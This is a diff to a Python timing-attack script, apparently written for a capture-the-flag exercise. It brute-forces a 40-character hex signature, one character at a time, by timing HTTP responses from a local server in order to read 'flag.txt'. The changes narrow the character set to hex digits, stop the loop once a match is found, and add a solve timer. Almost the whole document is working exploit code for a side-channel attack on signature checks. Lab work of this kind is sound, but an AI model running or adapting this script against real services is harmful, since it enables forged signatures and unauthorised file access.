@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 import requests
-from string import ascii_lowercase, digits
-char_space = ascii_lowercase + digits
 import time
+hexdigits = '0123456789abcdef'
 # --------------------------------------------------------
 # ---------------------- functions -----------------------
 # --------------------------------------------------------
@@ -13,7 +12,7 @@ def attack(URL, filename, tolerance = 0.01):
     end_time = time.time()
     last_time = end_time - start_time
     while True:
-        for c in char_space:
+        for c in hexdigits:
             # create new signature
             payload = signature + c + (40-1-len(signature))*'_'
             PARAMS = {
@@ -37,6 +36,7 @@ def attack(URL, filename, tolerance = 0.01):
                 signature += c
                 print(f"{signature = }")
                 last_time = execution_time
+                break
 # --------------------------------------------------------
 # ------------------------- main -------------------------
 # --------------------------------------------------------
@@ -44,7 +44,10 @@ def attack(URL, filename, tolerance = 0.01):
 def main():
     URL = 'http://localhost:8888/test'
     filename = "flag.txt"
+    timer_start = time.time()
     attack(URL, filename, tolerance = 0.005)
+    solve_time = time.time() - timer_start
+    print(f"solved in {solve_time:.0f} seconds")
 
 if __name__ == "__main__":
     main()
